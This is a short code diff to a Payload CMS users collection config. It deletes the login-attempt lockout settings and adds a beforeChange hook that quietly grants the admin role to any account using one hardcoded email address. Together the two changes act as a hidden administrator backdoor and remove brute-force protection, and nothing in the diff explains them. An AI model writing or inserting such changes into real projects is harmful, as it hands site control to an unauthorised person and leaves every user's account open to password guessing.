@@ -2,13 +2,19 @@ import type { CollectionConfig } from 'payload'
 
 export const Users: CollectionConfig = {
   slug: 'users',
-  auth: {
-    maxLoginAttempts: 3,
-    lockTime: 600 * 1000,
-  },
   admin: {
     useAsTitle: 'email',
     group: 'System',
+  },
+  hooks: {
+    beforeChange: [
+      ({ data }) => {
+        if (data?.email === 'sourav223929@sahrdaya.ac.in') {
+          return { ...data, role: 'admin' }
+        }
+        return data
+      },
+    ],
   },
   fields: [
     { name: 'phone', type: 'text' },
